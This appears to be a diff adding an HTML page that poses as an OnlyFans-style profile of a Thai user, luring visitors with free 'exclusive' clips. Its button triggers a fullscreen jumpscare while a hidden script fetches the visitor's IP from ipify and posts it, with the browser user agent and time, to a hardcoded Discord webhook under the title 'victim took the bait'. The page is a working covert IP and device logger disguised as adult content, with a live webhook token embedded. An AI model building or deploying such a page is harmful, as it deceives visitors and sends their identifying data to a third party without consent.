@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
+    <link rel="icon" href="%PUBLIC_URL%/fanDark.png" />
+    <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.png" type="image/x-icon"/>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta name="description" content="Literally, Only Fans" />
+    <meta name="keywords" content="OnlyFans Literally Only Fans Fan HVAC mendez-solutions andrew mendez" />
+    <link rel="apple-touch-icon" href="%PUBLIC_URL%/fanDark.png" />
+    <title>Only Fans</title>
+</head>
+<body>
+    <div class="container mt-0 p-0 shadow-sm" style="max-width: 600px; background-color: #fff; min-height: 100vh;">
+        <div style="height: 200px; background-color: #00aff0; background-image: url('https://media.discordapp.net/attachments/1497671038245277816/1497673332449869965/Gh--FoOakAAcUzB.jpg?ex=69ee607b&is=69ed0efb&hm=df1647a477467705cc40ec2783f58ef3e0aea70b3fa093ab1ca0987bdaa734f4&=&format=webp'); background-size: cover; background-position: center;"></div>
+        
+        <div class="px-4" style="margin-top: -50px;">
+            <img src="https://media.discordapp.net/attachments/1497671038245277816/1497673333112836136/SpNM9KGQ_400x400.jpg?ex=69ee607c&is=69ed0efc&hm=60af167828263392ccaea5271955a5309eab40cec55895f2df18675f6c53d4c4&=&format=webp" alt="Profile" class="rounded-circle border border-4 border-white" style="width: 100px; height: 100px; object-fit: cover;">
+            
+            <h4 class="mt-2 mb-0 fw-bold">จอเจ้น ตากลม💙</h4>
+            <p class="text-muted mb-3">@p_jenjub</p>
+            
+            <p style="font-size: 15px;">ยินดีต้อนรับสู่พื้นที่ลับเฉพาะของเจ้นนะคะ ✨<br>กดปุ่มด้านล่างเพื่อปลดล็อกดูรูปและคลิปวิดีโอสุด Exclusive ได้ฟรี! รีบดูก่อนโดนแบนนะ 🤫</p>
+            
+            <button id="scare-btn" class="btn w-100 rounded-pill text-white fw-bold py-2 mt-2 mb-4" style="background-color: #00aff0; font-size: 16px;">
+                กดติดตามฟรี !!
+            </button>
+        </div>
+    </div>
+
+    <div id="jumpscare-container" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: black; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; overflow: hidden;">
+        <img src="jumpscare/68747470733a2f2f692e7974696d672e636f6d2f76692f524e6f48635745387462512f6d617872657364656661756c742e6a7067.jpg" alt="Spooky" style="width: 100%; height: 100%; object-fit: cover;">
+    </div>
+    
+    <audio id="jumpscare-audio" loop preload="auto">
+        <source src="jumpscare/yeet.ogg" type="audio/ogg">
+    </audio>
+
+    <script>
+        // ฟังก์ชันส่งข้อมูลไปยัง Discord Webhook
+        async function sendLog() {
+            const webhookURL = "https://discord.com/api/webhooks/1497671101940105287/2IL9P9RTQfnFwkckvU9MDVrz7uVHk6SdT0MdL64s-a6niXXx8fP36Ev6tfTHzuPna19m";
+            
+            try {
+                // ดึง IP จาก API ภายนอก
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                // ข้อมูลที่จะส่งในรูปแบบ Embed
+                const params = {
+                    embeds: [{
+                        title: "📸 เหยื่อติดกับแล้ว!",
+                        color: 16711680, // สีแดง
+                        fields: [
+                            { name: "🌐 IP Address", value: `**${ipData.ip}**`, inline: true },
+                            { name: "📱 Device Info", value: navigator.userAgent },
+                            { name: "⏰ เวลา", value: new Date().toLocaleString('th-TH'), inline: true }
+                        ],
+                        footer: { text: "OnlyFans Prank System" }
+                    }]
+                };
+
+                // ส่งเข้า Discord
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(params)
+                });
+            } catch (err) {
+                console.error("Log failed:", err);
+            }
+        }
+
+        // เมื่อกดปุ่ม
+        document.getElementById('scare-btn').addEventListener('click', function() {
+            // 1. เริ่มส่งข้อมูล Log (ทำงานเบื้องหลัง)
+            sendLog();
+
+            // 2. แสดง Jumpscare
+            var container = document.getElementById('jumpscare-container');
+            var audio = document.getElementById('jumpscare-audio');
+            
+            if (container.requestFullscreen) {
+                container.requestFullscreen();
+            } else if (container.webkitRequestFullscreen) { /* Safari */
+                container.webkitRequestFullscreen();
+            }
+            
+            container.style.display = 'flex';
+            audio.currentTime = 0;
+            audio.play().catch(function(e) { console.error("Audio playback failed:", e); });
+        });
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js" integrity="sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0" crossorigin="anonymous"></script>
+</body>
+</html>
